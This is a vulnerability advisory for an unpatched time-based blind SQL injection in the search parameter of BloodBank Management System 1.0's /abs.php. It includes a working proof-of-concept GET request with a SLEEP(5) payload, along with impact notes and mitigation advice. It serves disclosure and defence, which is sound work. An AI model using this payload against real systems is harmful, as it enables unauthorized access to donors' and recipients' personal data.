[**sqli\_abp\_search.md**](#file-sqli_abp_search-md)

## **Affected Version:**

* **BloodBank Management System**: 1.0

## **Vulnerability Information:**

* **Vulnerability Type:** SQL Injection (Time-Based Blind)
* **Severity:** HIGH
* **Status:** Unpatched

## **Vulnerable Endpoint:**

* `/abs.php?search=A%2B&submit=search`

## **Vulnerability Description:**

A **SQL Injection vulnerability** has been identified in the **BloodBank Management System** version 1.0. This vulnerability occurs in the **search functionality** when users query blood type availability. The `search` parameter is not properly sanitized, allowing attackers to inject malicious SQL queries.

This vulnerability allows an attacker to manipulate SQL queries and execute arbitrary database commands, potentially leading to:

* **Unauthorized access** to sensitive data (e.g., donor or recipient information).
* **Database corruption** or deletion.
* **Denial of Service (DoS)** attacks by causing the database to execute time-consuming operations.

Since the injected payload persists through the search feature, this **high-risk vulnerability** could be exploited by remote attackers, leading to a significant breach of confidentiality and availability.

---

## **Proof of Concept (PoC):**

Below is an example of a **GET** request that demonstrates a **time-based blind SQL injection**. This payload causes the database to **sleep for 5 seconds**, proving the injection is successful:

```
GET /abs.php?search=A%2b'%20AND%20(SELECT%209622%20FROM%20(SELECT(SLEEP(5)))lCfZ)--%20lpxk%26submit%3dsearch&submit=search HTTP/1.1

sec-ch-ua-platform: "Linux"

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36

Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48068ce7875c00d88ca3aa2b9269b91f
Connection: keep-alive

```

If the query is successful, the system will **pause for 5 seconds** before responding. This confirms the vulnerability and proves that the query can be manipulated to execute arbitrary SQL commands.

---

## **Impact:**

* **Data Breach:** Unauthorized access to personal information such as blood donors’ and recipients’ data.
* **Service Disruption:** Attackers can overload the database, causing a **Denial of Service (DoS)** by executing time-intensive queries.
* **Data Corruption:** Malicious actors can modify or delete critical data in the system.

## **Mitigation Recommendations:**

1. **Input Validation & Sanitization:** Use parameterized queries or prepared statements to prevent SQL injection.
2. **Error Handling:** Ensure error messages do not reveal database information or SQL query structures.
3. **Rate Limiting:** Implement rate limiting on search requests to prevent abuse via DoS attacks.
4. **Database User Privileges:** Restrict the privileges of database users to minimize the impact of potential SQL injections.
5. **Security Audits:** Regularly perform code reviews and penetration tests to identify and fix vulnerabilities.
